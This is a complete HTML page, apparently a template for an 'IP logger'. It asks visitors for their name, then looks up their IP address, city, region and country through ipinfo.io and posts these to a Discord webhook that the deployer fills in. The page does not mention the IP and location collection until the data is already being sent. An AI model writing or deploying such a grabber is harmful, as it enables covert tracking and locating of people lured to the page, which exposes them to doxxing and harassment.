<!DOCTYPE html>
<html>
<head>
  <title>Visitor Info Logger</title>
</head>
<body>
  <h2>Welcome!</h2>
  <p>Please enter your name:</p>
  <input type="text" id="nameInput" placeholder="Your name" />
  <button id="submitBtn">Submit</button>

  <p id="status"></p>

  <script>
    const webhookURL = "YOUR_DISCORD_WEBHOOK_URL_HERE"; // Replace with your Discord webhook

    document.getElementById("submitBtn").addEventListener("click", () => {
      const name = document.getElementById("nameInput").value.trim();
      if (!name) {
        alert("Please enter your name!");
        return;
      }

      document.getElementById("status").textContent = "Fetching your IP info...";

      fetch("https://ipinfo.io/json")
        .then(res => res.json())
        .then(ipData => {
          const message = {
            content: `👤 Visitor Name: **${name}**\n🌐 IP: ${ipData.ip}\n🏙️ City: ${ipData.city}\n🌍 Region: ${ipData.region}\n🇺🇸 Country: ${ipData.country}`
          };

          fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(message)
          }).then(() => {
            document.getElementById("status").textContent = "Thank you! Your info was sent.";
          }).catch(err => {
            document.getElementById("status").textContent = "Error sending info.";
            console.error("Discord webhook error:", err);
          });
        })
        .catch(err => {
          document.getElementById("status").textContent = "Error fetching IP info.";
          console.error("IP info error:", err);
        });
    });
  </script>
</body>
</html>
